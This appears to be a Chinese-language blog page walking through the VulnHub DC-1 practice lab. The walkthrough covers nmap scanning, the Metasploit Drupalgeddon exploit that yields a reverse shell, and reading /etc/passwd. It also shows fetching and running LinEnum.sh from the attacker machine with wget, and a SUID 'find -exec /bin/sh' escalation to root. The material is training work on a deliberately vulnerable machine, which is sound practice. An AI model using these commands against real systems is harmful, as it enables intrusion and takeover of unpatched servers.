@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>vulnhub_DC1靶场复现 | 北轨的博客</title><meta name="keywords" content="vulnhub靶场复现"><meta name="author" content="北轨"><meta name="copyright" content="北轨"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言最近在家空闲时间增多，遂将vulhub靶场复现记录一番，第一篇文章从DC1开始写起，DC系列靶场在官方描述中属于初级靶场，所以我们先由DC1开始由浅入深。 靶场描述(官网机翻)DC-1是一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。 它旨在为初学者带来挑战，但它的难易程度将取决于您的技能和知识以及您的学习能力。 要成功完成此挑战，您将需要Linux技能，熟悉Linux命令行以及">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub_DC1靶场复现">
+<meta property="og:url" content="http://www.beigui.xyz/2022/06/16/vulnhub-DC1/index.html">
+<meta property="og:site_name" content="北轨的博客">
+<meta property="og:description" content="前言最近在家空闲时间增多，遂将vulhub靶场复现记录一番，第一篇文章从DC1开始写起，DC系列靶场在官方描述中属于初级靶场，所以我们先由DC1开始由浅入深。 靶场描述(官网机翻)DC-1是一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。 它旨在为初学者带来挑战，但它的难易程度将取决于您的技能和知识以及您的学习能力。 要成功完成此挑战，您将需要Linux技能，熟悉Linux命令行以及">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.328888.xyz/2022/06/16/0Q5xm.jpg">
+<meta property="article:published_time" content="2022-06-16T08:13:49.000Z">
+<meta property="article:modified_time" content="2022-06-17T03:05:09.322Z">
+<meta property="article:author" content="北轨">
+<meta property="article:tag" content="vulnhub靶场复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.328888.xyz/2022/06/16/0Q5xm.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.beigui.xyz/2022/06/16/vulnhub-DC1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub_DC1靶场复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-17 11:05:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.328888.xyz/2022/06/16/0Q5xm.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">北轨的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub_DC1靶场复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-16T08:13:49.000Z" title="发表于 2022-06-16 16:13:49">2022-06-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-17T03:05:09.322Z" title="更新于 2022-06-17 11:05:09">2022-06-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub_DC1靶场复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在家空闲时间增多，遂将vulhub靶场复现记录一番，第一篇文章从DC1开始写起，DC系列靶场在官方描述中属于初级靶场，所以我们先由DC1开始由浅入深。</p>
+<h1 id="靶场描述-官网机翻"><a href="#靶场描述-官网机翻" class="headerlink" title="靶场描述(官网机翻)"></a>靶场描述(官网机翻)</h1><p>DC-1是一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</p>
+<p>它旨在为初学者带来挑战，但它的难易程度将取决于您的技能和知识以及您的学习能力。</p>
+<p>要成功完成此挑战，您将需要Linux技能，熟悉Linux命令行以及基本渗透测试工具的经验，例如可以在Kali Linux或Parrot Security OS上找到的工具。</p>
+<p>有多种方法可以获得根，但是，我已经包含了一些包含初学者线索的标志。</p>
+<p>总共有五个标志，但最终目标是在根的主目录中查找并读取该标志。您甚至不需要是root就可以执行此操作，但是，您将需要root权限。</p>
+<p>根据您的技能水平，您可以跳过查找这些标志中的大多数，并直接找到根。</p>
+<p>初学者可能会遇到以前从未遇到过的挑战，但是Google搜索应该是获得完成此挑战所需信息所需的全部内容。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在官网下载DC1的系统压缩包 <a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
+<p>将压缩包解压后使用vm虚拟机打开，获得一个Linux系统，将虚拟机设置为NAT模式，使其和我们的攻击机在一个局域网环境下。</p>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>1.我们先查看攻击机IP地址和所在局域网掩码。</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616165648.png" alt="image-20220616162316861"></p>
+<p>2.使用nmap对网段攻击机和靶机所在局域网进行扫描，检测存活主机。结果如下图所示，其中抛去网关和攻击机IP可以确定靶机为192.168.211.131</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616165948.png" alt="image-20220616165948499"></p>
+<p>3.对靶机IP进行扫描，从图片中可以看出靶机一共开放三个端口分别是22，80，111。其中80端口运行的cms为drupal 7,我们以此为突破口多靶机进行攻击。</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616170219.png" alt="image-20220616170219676"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.Drupal 7存在多个CVE漏洞，我们先尝试使用msf中所带的exp进行攻击，通过search进行搜索可以看到msf中存在多个Drupal的exp，我们使用横线标注的exp进行攻击</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616191621.png" alt="image-20220616170735515"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon </span><br><span class="line">set rhosts 192.168.211.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616191554.png" alt="image-20220616171121092"></p>
+<p>2.使用上面的配置命令成功获得meterpreter的反弹shell，输入shell命令获取linux的shell，如图所示</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616191603.png" alt="image-20220616174929398"></p>
+<p>但是这样的shell存在很大的弊端既不美观用起来也很别扭，所以我们这里使用python语句获取tty</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616175531.png" alt="image-20220616175110128"></p>
+<p>使用find命令查询flag，获得flag1.txt。flag1.txt中一句英文，<strong>Every good CMS needs a config file - and so do you</strong></p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616175731.png" alt="image-20220616175731653"></p>
+<p>说明第二个flag2是在Drupal配置文件当中。这里先放下既然拿到了shell肯定是要看一眼&#x2F;etc&#x2F;passwd，然后在etc&#x2F;passwd发现了点东西</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616191123.png" alt="image-20220616191123125"></p>
+<p>这里竟然存在一个flag4的用户，我们进入到flag4用户下发现flag4.txt，读取flag4.txt。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<p>这里是让我们读取root目录下的flag，这里就需要用到提权的手段了。我们先收集一波信息看一下系统的版本。我们可以看到靶机系统是Debian 3.2.102-1，在网上检索一下这个版本的提权方法</p>
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616182704.png" alt="image-20220616182704942"></p>
+<p>这里使用LInuEnum进行提权</p>
+<p>kali 下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rebootuser/LinEnum.git</span><br></pre></td></tr></table></figure>
+
+<p>将LinEnum目录下面的LinEnum.sh放到kali的http服务主目录下，在我们之前获取到的靶机shell下进行下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.211.130/LinEnum.sh</span><br><span class="line">bash LinEnum.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616190756.png" alt="image-20220616190756063"></p>
+<p>执行完毕后得到输入，获得root权限，在root目录下得到最终flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220616191011.png" alt="image-20220616191011770"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://www.beigui.xyz">北轨</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.beigui.xyz/2022/06/16/vulnhub-DC1/">http://www.beigui.xyz/2022/06/16/vulnhub-DC1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.beigui.xyz" target="_blank">北轨的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">vulnhub靶场复现</a></div><div class="post_share"><div class="social-share" data-image="https://s1.328888.xyz/2022/06/16/0Q5xm.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/17/vulnhub-DC2/"><img class="prev-cover" src="https://s1.328888.xyz/2022/06/17/0JCXk.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub_DC2靶场复现</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/15/windows-blue-Team/"><img class="next-cover" src="https://s1.328888.xyz/2022/06/15/pRjI2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">windows应急响应入侵排查</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/17/vulnhub-DC2/" title="vulnhub_DC2靶场复现"><img class="cover" src="https://s1.328888.xyz/2022/06/17/0JCXk.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-17</div><div class="title">vulnhub_DC2靶场复现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">北轨</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/bei-gui"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/bei-gui" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1769606485@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1769606485&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://space.bilibili.com/479406079" target="_blank" title="网易云"><i class="fab fa-bilibili"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，一个记录生活小天地</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0-%E5%AE%98%E7%BD%91%E6%9C%BA%E7%BF%BB"><span class="toc-number">2.</span> <span class="toc-text">靶场描述(官网机翻)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/17/vulnhub-DC2/" title="vulnhub_DC2靶场复现"><img src="https://s1.328888.xyz/2022/06/17/0JCXk.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub_DC2靶场复现"/></a><div class="content"><a class="title" href="/2022/06/17/vulnhub-DC2/" title="vulnhub_DC2靶场复现">vulnhub_DC2靶场复现</a><time datetime="2022-06-17T03:01:19.000Z" title="发表于 2022-06-17 11:01:19">2022-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/16/vulnhub-DC1/" title="vulnhub_DC1靶场复现"><img src="https://s1.328888.xyz/2022/06/16/0Q5xm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub_DC1靶场复现"/></a><div class="content"><a class="title" href="/2022/06/16/vulnhub-DC1/" title="vulnhub_DC1靶场复现">vulnhub_DC1靶场复现</a><time datetime="2022-06-16T08:13:49.000Z" title="发表于 2022-06-16 16:13:49">2022-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/15/windows-blue-Team/" title="windows应急响应入侵排查"><img src="https://s1.328888.xyz/2022/06/15/pRjI2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows应急响应入侵排查"/></a><div class="content"><a class="title" href="/2022/06/15/windows-blue-Team/" title="windows应急响应入侵排查">windows应急响应入侵排查</a><time datetime="2022-06-15T00:32:49.000Z" title="发表于 2022-06-15 08:32:49">2022-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/15/linux-blue-Team/" title="linux应急响应入侵排查"><img src="https://s1.328888.xyz/2022/06/15/pRneQ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux应急响应入侵排查"/></a><div class="content"><a class="title" href="/2022/06/15/linux-blue-Team/" title="linux应急响应入侵排查">linux应急响应入侵排查</a><time datetime="2022-06-15T00:14:33.000Z" title="发表于 2022-06-15 08:14:33">2022-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/26/Dest0g3/" title="Dest0g3迎新赛部分WP"><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220527174718.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dest0g3迎新赛部分WP"/></a><div class="content"><a class="title" href="/2022/05/26/Dest0g3/" title="Dest0g3迎新赛部分WP">Dest0g3迎新赛部分WP</a><time datetime="2022-05-26T10:48:06.000Z" title="发表于 2022-05-26 18:48:06">2022-05-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/05/10/BGYIv4eOVU9SMF5.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 北轨</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
